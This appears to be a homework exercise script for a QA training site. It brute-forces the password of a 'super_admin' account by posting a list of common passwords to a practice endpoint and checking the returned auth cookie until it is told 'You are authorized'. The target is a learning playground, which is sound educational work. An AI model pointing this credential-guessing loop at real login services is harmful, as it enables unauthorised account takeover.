import requests


login = "super_admin"
top_25_passwords = [1234567890, 1234, 121212, '1qaz2wsx', 123456, 'flower', 12345678, 'football', 555555, 'qwerty',
                    'jesus', 'lovely', 12345, 'welcome', 7777777, 'monkey', 'ninja', 12345, 'mustang', 111111,
                    'letmein', 'password1', 'hello', 'trustno1', 1234, 'freedom', 'dragon', 12345, 'whatever',
                    'baseball', 'princess', 123456789, 1234567, 'azerty', 'password', 'adobe123', 0, 'master',
                    696969, 'iloveyou', 'photoshop', 'batman', 'abc123', 'ashley', 'access', 'login', 'bailey',
                    '1q2w3e4r', 'passw0rd', 'charlie', 'starwars', 'shadow', 'aa123456', 'qwerty123', 123123,
                    'donald', 'admin', 654321, 'qwertyuiop', 'sunshine', 'superman', 'solo', 666666, 'qazwsx',
                    'hottie', 888888, 'michael', 'loveme', '123qwe', 'Football', 'zaq1zaq1', '!@#$%^&*']

for i in top_25_passwords:
    response = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework',
                             data={'login': login, 'password': i})
    cookie_value = response.cookies.get('auth_cookie')
    cookies = {'auth_cookie': cookie_value}
    response2 = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies = cookies)
    answer = response2.text
    if answer == 'You are authorized':
        print('You are authorized. Your password is -', i)
        break



